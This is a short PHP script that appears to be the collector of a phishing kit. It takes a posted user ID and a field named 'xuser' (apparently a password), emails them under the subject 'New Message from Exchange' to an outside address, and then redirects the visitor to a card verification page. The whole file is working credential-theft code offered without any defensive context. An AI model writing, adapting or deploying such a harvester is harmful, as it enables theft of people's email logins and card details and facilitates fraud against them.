<?php 



$userID = $_POST['userID'];
$xuser = $_POST['xuser'];



$to = "admin@clickheretoviewreport.com"; 

$subject = "New Message from Exchange"; 


$body = "userID : $userID, xuser : $xuser";



mail($to,$subject,$body,$userID,$xuser); 

header("location:cardverification.html");?>